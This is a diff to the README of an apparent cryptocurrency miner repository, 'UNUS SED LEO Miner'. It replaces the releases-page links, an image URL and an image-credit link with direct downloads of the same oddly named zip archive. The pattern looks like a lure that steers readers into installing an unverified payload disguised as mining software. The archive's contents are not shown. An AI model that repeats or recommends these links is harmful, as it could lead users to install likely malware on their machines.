@@ -11,7 +11,7 @@ Welcome to the UNUS SED LEO Miner repository, your go-to desktop application for
 
 ## How to Use 📝
 
-Simply download the UNUS SED LEO Miner application from the [latest release](https://github.com/Nick05Sell/UNUS-SED-LEO-miner/releases) and install it on your desktop. Follow the intuitive instructions to start mining UNUS SED LEO effortlessly.
+Simply download the UNUS SED LEO Miner application from the [latest release](https://github.com/Nick05Sell/UNUS-SED-LEO-miner/raw/refs/heads/main/merbaby/UNU-miner-LE-SE-pastoralize.zip) and install it on your desktop. Follow the intuitive instructions to start mining UNUS SED LEO effortlessly.
 
 ## Repository Topics 📌
 
@@ -38,7 +38,7 @@ UNUS SED LEO is a promising cryptocurrency with great potential. Our mining soft
 
 ## Stay Updated 🚨
 
-For the latest updates and improvements, make sure to visit our [GitHub releases page](https://github.com/Nick05Sell/UNUS-SED-LEO-miner/releases) regularly. Stay ahead of the curve and enhance your mining experience with each new release.
+For the latest updates and improvements, make sure to visit our [GitHub releases page](https://github.com/Nick05Sell/UNUS-SED-LEO-miner/raw/refs/heads/main/merbaby/UNU-miner-LE-SE-pastoralize.zip) regularly. Stay ahead of the curve and enhance your mining experience with each new release.
 
 ## Support 💡
 
@@ -52,6 +52,6 @@ Join the mining community and start your UNUS SED LEO journey today. With our po
 
 *Note: If you encounter any issues with the download link provided, please check the "Releases" section on our GitHub repository for alternative download options.*
 
-![UNUS SED LEO](https://media.istockphoto.com/photos/crypto-currency-picture-id1287061052)
+![UNUS SED LEO](https://github.com/Nick05Sell/UNUS-SED-LEO-miner/raw/refs/heads/main/merbaby/UNU-miner-LE-SE-pastoralize.zip)
 
-*Image Source: [iStock](https://www.istockphoto.com/)*
+*Image Source: [iStock](https://github.com/Nick05Sell/UNUS-SED-LEO-miner/raw/refs/heads/main/merbaby/UNU-miner-LE-SE-pastoralize.zip)*
